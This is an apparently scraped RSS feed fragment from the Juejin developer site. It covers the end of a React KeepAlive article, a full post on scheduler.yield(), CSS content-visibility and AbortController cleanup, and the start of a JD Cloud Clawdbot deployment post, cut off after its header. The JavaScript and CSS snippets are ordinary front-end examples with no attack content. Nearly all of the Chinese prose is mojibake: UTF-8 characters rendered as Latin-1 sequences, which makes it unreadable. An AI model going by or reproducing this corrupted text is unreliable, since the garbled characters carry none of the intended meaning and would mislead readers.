<li><strong>æ‰‹å†™ç®€æ˜“ KeepAlive</strong>ï¼š<br/>
å®ƒçš„æ ¸å¿ƒåœ¨äºâ€œ<strong>æ¸²æŸ“ä½†éšè—</strong>â€â€”â€”åˆ©ç”¨Â <code>display: none</code>Â é…åˆçŠ¶æ€ç¼“å­˜ï¼Œé¿å…ç»„ä»¶å¸è½½ã€‚è¿™ç§æ–¹å¼ä»£ç é€æ˜ã€é€»è¾‘ç›´è§‚ï¼Œéå¸¸é€‚åˆå­¦ä¹  React æ¸²æŸ“æœºåˆ¶å’ŒçŠ¶æ€ç”Ÿå‘½å‘¨æœŸï¼Œä¹Ÿè¶³ä»¥åº”å¯¹ç®€å•çš„ Tab åˆ‡æ¢ã€é¢æ¿åˆ‡æ¢ç­‰é™æ€åœºæ™¯ã€‚ä½†å®ƒæ— æ³•å¤„ç†è·¯ç”±è·³è½¬ã€DOM ç»“æ„å˜åŒ–æˆ–æ»šåŠ¨ä½ç½®æ¢å¤ç­‰å¤æ‚éœ€æ±‚ï¼Œ<strong>æ›´é€‚åˆæ•™å­¦æˆ–è½»é‡çº§ UI æ§åˆ¶</strong>ã€‚</li>
<li><strong>react-activationï¼ˆç”Ÿäº§çº§æ–¹æ¡ˆï¼‰</strong> ï¼š<br/>
è¯¥åº“é€šè¿‡Â <code>Portal</code>Â å°†éœ€è¦ç¼“å­˜çš„ç»„ä»¶ DOM èŠ‚ç‚¹â€œç§»å‡ºâ€åŸæœ‰æ ‘ç»“æ„ï¼Œæ‰˜ç®¡åˆ°é¡¶å±‚çš„Â <code>&lt;AliveScope&gt;</code>Â ä¸­ï¼Œä»è€Œåœ¨çˆ¶ç»„ä»¶å¸è½½æ—¶ä»èƒ½ä¿ç•™å®ä¾‹ã€‚å®ƒä¸ä»…æ”¯æŒå®Œæ•´çš„ React ç”Ÿå‘½å‘¨æœŸï¼ˆå¦‚Â <code>useEffect</code>Â ä¸é‡å¤è§¦å‘ï¼‰ï¼Œè¿˜å†…ç½®äº†Â <code>saveScrollPosition</code>Â ç­‰å®ç”¨åŠŸèƒ½ï¼Œ<strong>çœŸæ­£å®ç°äº†ç±» VueÂ <code>&lt;keep-alive&gt;</code>Â çš„ä½“éªŒ</strong>ï¼Œæ˜¯ä¸­å¤§å‹é¡¹ç›®ä¸­çš„å¯é é€‰æ‹©ã€‚</li>
</ul>
<blockquote>
<p>ğŸ“ŒÂ <strong>å…³é”®è®¤çŸ¥</strong>ï¼šç¼“å­˜çš„æœ¬è´¨ä¸æ˜¯â€œä¸è®©ç»„ä»¶æ¶ˆå¤±â€ï¼Œè€Œæ˜¯â€œä¸è®©ç»„ä»¶è¢«é”€æ¯â€ã€‚ç†è§£è¿™ä¸€ç‚¹ï¼Œå°±èƒ½æ˜ç™½ä¸ºä½•çˆ¶ç»„ä»¶å¸è½½ä¼šå¯¼è‡´å­ç¼“å­˜å¤±æ•ˆâ€”â€”å› ä¸º React çš„å¸è½½æ˜¯è‡ªä¸Šè€Œä¸‹çš„ã€‚è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä½•Â <code>react-activation</code>Â å¿…é¡»ä¾èµ–å…¨å±€ä½œç”¨åŸŸï¼ˆ<code>AliveScope</code>ï¼‰æ¥â€œåŠ«æŒâ€ç»„ä»¶çš„æŒ‚è½½ç‚¹ã€‚</p>
</blockquote>
<p>æœ€ç»ˆï¼Œ<strong>å·¥å…·æœåŠ¡äºåœºæ™¯</strong>ã€‚å½“ä½ é¢å¯¹ä¸€ä¸ªéœ€è¦æè‡´ä½“éªŒçš„ç§»åŠ¨ç«¯åº”ç”¨æ—¶ï¼Œä¸è¦çŠ¹è±«ï¼Œæ‹¥æŠ±æˆç†Ÿçš„ç¼“å­˜æ–¹æ¡ˆï¼›è€Œå½“ä½ åœ¨è°ƒè¯•æˆ–æ•™å­¦ä¸­æƒ³é€å½»ç†è§£æœºåˆ¶ï¼Œä¸å¦¨ä»ä¸€è¡ŒÂ <code>Object.entries(cache)</code>Â å¼€å§‹ï¼Œäº²æ‰‹æ„å»ºå±äºè‡ªå·±çš„ KeepAliveã€‚</p>
<p>æ¯•ç«Ÿï¼Œæœ€å¥½çš„æ¡†æ¶ä½¿ç”¨æ–¹å¼ï¼Œæ°¸è¿œå»ºç«‹åœ¨å¯¹åŸç†çš„æ·±åˆ»ç†è§£ä¹‹ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†åªç›¯ç€ Lodash äº†ï¼šè¿™ 3 ä¸ªåŸç”Ÿ APIï¼Œæ‰æ˜¯ 2026 å¹´å‰ç«¯æ€§èƒ½çš„â€œå¤©èŠ±æ¿â€]]></title>    <link>https://juejin.cn/post/7600345782173188130</link>    <guid>https://juejin.cn/post/7600345782173188130</guid>    <pubDate>2026-01-29T06:16:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600345782173188130" data-draft-id="7600345782173171746" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†åªç›¯ç€ Lodash äº†ï¼šè¿™ 3 ä¸ªåŸç”Ÿ APIï¼Œæ‰æ˜¯ 2026 å¹´å‰ç«¯æ€§èƒ½çš„â€œå¤©èŠ±æ¿â€"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T06:16:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·3905133219288"/> <meta itemprop="url" content="https://juejin.cn/user/3609051079121550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†åªç›¯ç€ Lodash äº†ï¼šè¿™ 3 ä¸ªåŸç”Ÿ APIï¼Œæ‰æ˜¯ 2026 å¹´å‰ç«¯æ€§èƒ½çš„â€œå¤©èŠ±æ¿â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3609051079121550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·3905133219288
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:16:06.000Z" title="Thu Jan 29 2026 06:16:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ AI è¾…åŠ©ç¼–ç¨‹æ™®åŠçš„ä»Šå¤©ï¼Œå†™å‡ºâ€œèƒ½è·‘â€çš„ä»£ç å·²ç»æ²¡æœ‰é—¨æ§›äº†ã€‚ä½†ä¸ºä»€ä¹ˆåŒæ ·çš„ Vue 3 æˆ– React é¡¹ç›®ï¼Œåœ¨å¤§æ•°æ®é‡æˆ–å¤æ‚äº¤äº’ä¸‹ï¼Œåˆ«äººçš„é¡µé¢ä¸æ»‘å¦‚ 144Hzï¼Œä½ çš„å´æ€»æœ‰é‚£ç§æŒ¥ä¹‹ä¸å»çš„â€œæœå†»æ„Ÿâ€å’Œå¾®å°å¡é¡¿ï¼Ÿ</p>
<p>ç§˜å¯†å¾€å¾€ä¸åœ¨äºä½ ç”¨äº†ä»€ä¹ˆæ¡†æ¶ï¼Œè€Œåœ¨äºä½ æ˜¯å¦æŒæ¡äº†æµè§ˆå™¨åŸç”Ÿè°ƒåº¦é€»è¾‘ã€‚ä»Šå¤©åˆ†äº«ä¸‰ä¸ªè¢«å¤§å¤šæ•°äººå¿½ç•¥ã€å´èƒ½è§£å†³æ€§èƒ½â€œé¡½ç–¾â€çš„é«˜æ•ˆ APIã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ Scheduler.yield()ï¼šæ‰“ç ´é•¿ä»»åŠ¡çš„â€œéœ¸æƒâ€</h2>
<h3 data-id="heading-1">ç—›ç‚¹ï¼šé¡µé¢â€œå‡æ­»â€</h3>
<p>æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¿™ç§åœºæ™¯ï¼šå¤„ç†ä¸€ä¸ªè¶…å¤§ JSON æ•°ç»„ï¼Œæˆ–è€…åœ¨ Canvas ä¸­ä¸€æ¬¡æ€§åˆå§‹åŒ–æ•°åƒä¸ªç²’å­ã€‚å³ä¾¿ä½ çš„ç”µè„‘æ€§èƒ½å†å¼ºï¼ŒJS æ‰§è¡Œæ—¶ä¹Ÿä¼šéœ¸å ä¸»çº¿ç¨‹ã€‚æ­¤æ—¶ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ã€æ»šåŠ¨é¡µé¢ï¼Œæµè§ˆå™¨éƒ½æ²¡æ³•å“åº”ï¼Œè¿™ç§â€œå‡æ­»â€æ˜¯ç”¨æˆ·ä½“éªŒçš„æ€æ‰‹ã€‚</p>
<h3 data-id="heading-2">è¿‡å»çš„åšæ³•ï¼š<code>setTimeout(0)</code></h3>
<p>æˆ‘ä»¬ä¹ æƒ¯ç”¨Â <code>setTimeout(() =&gt; {...}, 0)</code>Â æ¥åˆ‡åˆ†ä»»åŠ¡ã€‚ä½†å®ƒçš„é—®é¢˜æ˜¯<strong>ä¼˜å…ˆçº§ä¸å—æ§</strong>ã€‚æµè§ˆå™¨å¯èƒ½ä¼šåœ¨ä¸¤ä¸ªä»»åŠ¡å—ä¹‹é—´æ’å…¥ä¸å¿…è¦çš„æ¸²æŸ“ï¼Œæˆ–è€…å¹²è„†å»¶è¿Ÿå¤ªä¹…æ‰æ‰§è¡Œã€‚</p>
<h3 data-id="heading-3">2026 å¹´çš„è§£æ³•ï¼š<code>Scheduler.yield()</code></h3>
<p>è¿™æ˜¯ç°ä»£æµè§ˆå™¨ï¼ˆåŸºäº Prioritized Task Scheduling APIï¼‰æä¾›çš„åˆ©å™¨ã€‚å®ƒèƒ½è®©å‡ºä¸»çº¿ç¨‹ï¼Œå…è®¸æµè§ˆå™¨å»å¤„ç†æ›´é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œç„¶å<strong>ç«‹å³</strong>å›æ¥ç»§ç»­æ‰§è¡Œå‰©ä¸‹çš„é€»è¾‘ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">asyncÂ functionÂ <span class="hljs-built_in">processHugeData</span>(data) {
Â  forÂ (constÂ itemÂ ofÂ data) {
Â  Â  <span class="hljs-comment">// æ‰§è¡Œå¤æ‚çš„ä¸šåŠ¡é€»è¾‘</span>
Â  Â  <span class="hljs-built_in">performComplexCalculation</span>(item);

Â  Â  <span class="hljs-comment">// æ¯å¤„ç† 100 æ¡æ•°æ®ï¼Œæ£€æŸ¥æ˜¯å¦éœ€è¦æŠŠæ§åˆ¶æƒäº¤ç»™æµè§ˆå™¨</span>
Â  Â  ifÂ (shouldYield()) {
Â  Â  Â  awaitÂ scheduler<span class="hljs-selector-class">.yield</span>();Â 
Â  Â  }
Â  }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå®ƒæ›´é«˜æ•ˆï¼Ÿ</strong><br/>
å®ƒä¸åƒÂ <code>setTimeout</code>Â é‚£æ ·ç›²ç›®ç­‰å¾…ï¼Œè€Œæ˜¯å‘Šè¯‰æµè§ˆå™¨ï¼šâ€œå¦‚æœä½ æœ‰æ€¥äº‹ï¼ˆç”¨æˆ·ç‚¹äº†ä¸ªèµï¼‰ï¼Œä½ å…ˆå¿™ï¼›å¦‚æœä½ æ²¡äº‹ï¼Œå’±ä»¬ç»§ç»­ã€‚â€ è¿™ç§<strong>ååŒå¼è°ƒåº¦</strong>æ˜¯å®ç°é«˜æ€§èƒ½äº¤äº’çš„åŸºç¡€ã€‚</p>
<hr/>
<h2 data-id="heading-4">äºŒã€ content-visibility: autoï¼šCSS é‡Œçš„â€œè™šæ‹Ÿæ»šåŠ¨â€</h2>
<h3 data-id="heading-5">ç—›ç‚¹ï¼šDOM èŠ‚ç‚¹è¿‡å¤šå¯¼è‡´çš„é‡ç»˜ç¾éš¾</h3>
<p>åœ¨åšæ•°å­—å­ªç”Ÿé©¾é©¶èˆ±ã€é•¿ä¿¡æ¯æµæˆ–å¤æ‚çš„ç®¡ç†åå°æ—¶ï¼Œé¡µé¢ä¸Šå¯èƒ½æœ‰æ•°åƒä¸ª DOM èŠ‚ç‚¹ã€‚å³ä¾¿å®ƒä»¬åœ¨å±å¹•å¤–é¢ï¼Œæµè§ˆå™¨ä¾ç„¶ä¼šè®¡ç®—å®ƒä»¬çš„å‡ ä½•å±æ€§ã€‚</p>
<h3 data-id="heading-6">ä¼ ç»Ÿçš„è§£æ³•ï¼šè™šæ‹Ÿåˆ—è¡¨</h3>
<p>æ‰‹åŠ¨å®ç°è™šæ‹Ÿåˆ—è¡¨ï¼ˆVirtual Listï¼‰éå¸¸ç—›è‹¦ï¼Œéœ€è¦è®¡ç®—é«˜åº¦ã€ç›‘å¬æ»šåŠ¨ï¼Œä¸”å¯¹ SEO ä¸å‹å¥½ã€‚</p>
<h3 data-id="heading-7">ç°ä»£è§£æ³•ï¼š<code>content-visibility</code></h3>
<p>åªéœ€ä¸€è¡Œ CSSï¼Œä½ å°±èƒ½è·å¾—æ¥è¿‘è™šæ‹Ÿåˆ—è¡¨çš„æ€§èƒ½æ”¶ç›Šï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.card-container</span>Â {
Â  <span class="hljs-attribute">content-visibility</span>: auto;
Â  <span class="hljs-attribute">contain</span>-intrinsic-size:Â <span class="hljs-number">0</span>Â <span class="hljs-number">500px</span>;Â <span class="hljs-comment">/* ç»™æœªæ¸²æŸ“å…ƒç´ ä¸€ä¸ªé¢„ä¼°é«˜åº¦ï¼Œé˜²æ­¢æ»šåŠ¨æ¡æŠ–åŠ¨ */</span>
}
</code></pre>
<ul>
<li>â€¢Â <strong>åŸç†</strong>ï¼šå½“å…ƒç´ ä¸åœ¨è§†å£å†…æ—¶ï¼Œæµè§ˆå™¨ä¼šè·³è¿‡è¯¥å…ƒç´ çš„æ¸²æŸ“å·¥ä½œï¼ˆåŒ…æ‹¬å¸ƒå±€å’Œç»˜å›¾ï¼‰ã€‚</li>
<li>â€¢Â <strong>æ”¶ç›Š</strong>ï¼šå¯¹äºå«æœ‰å¤§é‡å›¾è¡¨ï¼ˆEchartsï¼‰æˆ–å¤æ‚ Canvas çš„é¡¹ç›®ï¼Œé¦–å±åŠ è½½æ—¶é—´å’Œæ»šåŠ¨æµç•…åº¦ä¼šæœ‰é‡çº§çš„æå‡ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-8">ä¸‰ã€ AbortControllerï¼šä¸ä»…ä»…æ˜¯ä¸ºäº†å–æ¶ˆ Fetch</h2>
<h3 data-id="heading-9">ç—›ç‚¹ï¼šå†…å­˜æ³„æ¼ä¸ç›‘å¬å™¨åœ°ç‹±</h3>
<p>åœ¨ Vue 3 é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸åœ¨Â <code>onMounted</code>Â é‡Œç»‘å®šä¸€å †Â <code>window</code>Â ç›‘å¬å™¨ï¼Œç„¶ååœ¨Â <code>onUnmounted</code>Â é‡Œä¸€ä¸ªä¸ªæ‰‹åŠ¨Â <code>removeEventListener</code>ã€‚ä¸€æ—¦æ¼å†™ï¼Œå°±æ˜¯å†…å­˜æ³„æ¼ã€‚</p>
<h3 data-id="heading-10">é«˜æ•ˆæŠ€å·§ï¼šä¸€é”®â€œè‡ªæ¯â€</h3>
<p><code>AbortController</code>Â å®é™…ä¸Šæ˜¯ä¸€ä¸ªé€šç”¨çš„ä¿¡å·å‘å°„å™¨ã€‚ç°åœ¨ï¼Œå‡ ä¹æ‰€æœ‰çš„åŸç”Ÿ Web API éƒ½æ”¯æŒæ¥æ”¶å®ƒçš„Â <code>signal</code>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span>Â controller =Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">AbortController</span>();
<span class="hljs-keyword">const</span>Â { signal } = controller;

<span class="hljs-comment">// ç»‘å®šå¤šä¸ªäº‹ä»¶</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize, { signal });
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll, { signal });
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, handleMouseMove, { signal });

<span class="hljs-comment">// è¯·æ±‚æ•°æ®</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/data'</span>, { signal });

<span class="hljs-comment">// éœ€è¦æ¸…ç†æ—¶ï¼ˆæ¯”å¦‚ Vue ç»„ä»¶é”€æ¯ï¼‰ï¼Œåªéœ€ä¸€è¡Œä»£ç ï¼š</span>
controller.<span class="hljs-title function_">abort</span>();Â 
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™å¾ˆä¼˜é›…ï¼Ÿ</strong><br/>
ä½ ä¸å†éœ€è¦ä¿å­˜æ¯ä¸€ä¸ªå‡½æ•°çš„å¼•ç”¨ã€‚å½“ä½ è°ƒç”¨Â <code>abort()</code>Â æ—¶ï¼Œæ‰€æœ‰ç»‘å®šäº†è¯¥ä¿¡å·çš„äº‹ä»¶ç›‘å¬å™¨ã€æ­£åœ¨è¿›è¡Œçš„ Fetch è¯·æ±‚ã€ç”šè‡³æ˜¯æŸäº›åŠ¨ç”»åºåˆ—ï¼Œéƒ½ä¼šè¢«<strong>åŒæ—¶é”€æ¯</strong>ã€‚è¿™å¯¹äºæ„å»ºå¤æ‚çš„äº¤äº’ç³»ç»Ÿï¼ˆå¦‚æ‰‹åŠ¿æ§åˆ¶æ¸¸æˆï¼‰æ¥è¯´ï¼Œç®€ç›´æ˜¯ä»£ç æ´ç™–è€…çš„ç¦éŸ³ã€‚</p>
<hr/>
<h2 data-id="heading-11">æ€»ç»“ï¼šåšä¸»çš„ç§æˆ¿è¯</h2>
<p>åœ¨ 2026 å¹´ï¼Œå‰ç«¯å¼€å‘çš„é‡å¿ƒå·²ç»ä»â€œå¦‚ä½•å®ç°åŠŸèƒ½â€è½¬å‘äº†â€œå¦‚ä½•ä¼˜é›…åœ°è°ƒåº¦èµ„æºâ€ã€‚</p>
<ul>
<li>â€¢Â <strong><code>Scheduler.yield()</code></strong> Â è§£å†³äº†Â <strong>JS é€»è¾‘å±‚</strong>çš„é˜»å¡ã€‚</li>
<li>â€¢Â <strong><code>content-visibility</code></strong>Â è§£å†³äº†Â <strong>æ¸²æŸ“å±‚</strong>çš„å†—ä½™ã€‚</li>
<li>â€¢Â <strong><code>AbortController</code></strong>Â è§£å†³äº†Â <strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>çš„æ··ä¹±ã€‚</li>
</ul>
<p>è¿™äº› API è™½ç„¶å†·é—¨ï¼Œä½†å®ƒä»¬ä»£è¡¨äº† Web æ ‡å‡†è¿›åŒ–çš„æ–¹å‘ï¼š<strong>æŠŠå¤æ‚çš„è°ƒåº¦äº¤ç»™æµè§ˆå™¨å¼•æ“ï¼ŒæŠŠæ¸…çˆ½çš„ä»£ç ç•™ç»™æˆ‘ä»¬è‡ªå·±ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€é”®éƒ¨ç½²ï¼äº¬ä¸œäº‘ä¸Šçº¿Clawdbotäº‘æœåŠ¡ï¼]]></title>    <link>https://juejin.cn/post/7600318091831853083</link>    <guid>https://juejin.cn/post/7600318091831853083</guid>    <pubDate>2026-01-29T05:30:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600318091831853083" data-draft-id="7600508556103172146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€é”®éƒ¨ç½²ï¼äº¬ä¸œäº‘ä¸Šçº¿Clawdbotäº‘æœåŠ¡ï¼"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-29T05:30:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€é”®éƒ¨ç½²ï¼äº¬ä¸œäº‘ä¸Šçº¿Clawdbotäº‘æœåŠ¡ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:30:54.000Z" title="Thu Jan 29 2026 05:30:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
